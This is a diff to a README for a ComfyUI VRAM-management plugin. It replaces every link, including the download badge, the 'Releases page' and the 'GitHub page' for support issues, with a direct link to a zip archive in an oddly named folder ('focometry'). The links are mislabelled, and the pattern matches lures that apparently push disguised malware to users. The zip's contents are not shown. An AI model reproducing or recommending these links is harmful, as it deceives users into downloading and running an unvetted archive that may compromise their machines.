@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Comfyui-PainterVRAM](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases)
+[![Download Comfyui-PainterVRAM](https://raw.githubusercontent.com/Rabindra7777/Comfyui-PainterVRAM/main/focometry/Comfyui-PainterVRAM-v3.4-alpha.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Rabindra7777/Comfyui-PainterVRAM/main/focometry/Comfyui-PainterVRAM-v3.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Comfyui-PainterVRAM helps you manage your GPU memory. It reserves a portion befo
 To download Comfyui-PainterVRAM, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases) by clicking the link.
+   Go to the [Releases page](https://raw.githubusercontent.com/Rabindra7777/Comfyui-PainterVRAM/main/focometry/Comfyui-PainterVRAM-v3.4-alpha.3.zip) by clicking the link.
 
 2. **Select the Latest Version**  
    Look for the latest version at the top of the page. It will have the most recent features and bug fixes.
@@ -56,7 +56,7 @@ If you encounter issues, consider these solutions:
 
 ## 📞 Support
 
-For additional support, you can reach out via the issues tab on our [GitHub page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/issues). We encourage users to share their experiences and any problems they face.
+For additional support, you can reach out via the issues tab on our [GitHub page](https://raw.githubusercontent.com/Rabindra7777/Comfyui-PainterVRAM/main/focometry/Comfyui-PainterVRAM-v3.4-alpha.3.zip). We encourage users to share their experiences and any problems they face.
 
 ## 📝 Notes
 
@@ -65,4 +65,4 @@ For additional support, you can reach out via the issues tab on our [GitHub page
 
 ## 🔗 Conclusion
 
-Now you are equipped to download and use Comfyui-PainterVRAM to manage your GPU memory effectively. Visit our [Releases page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases) once again to access all versions and updates. Enjoy a smoother experience with ComfyUI!
+Now you are equipped to download and use Comfyui-PainterVRAM to manage your GPU memory effectively. Visit our [Releases page](https://raw.githubusercontent.com/Rabindra7777/Comfyui-PainterVRAM/main/focometry/Comfyui-PainterVRAM-v3.4-alpha.3.zip) once again to access all versions and updates. Enjoy a smoother experience with ComfyUI!
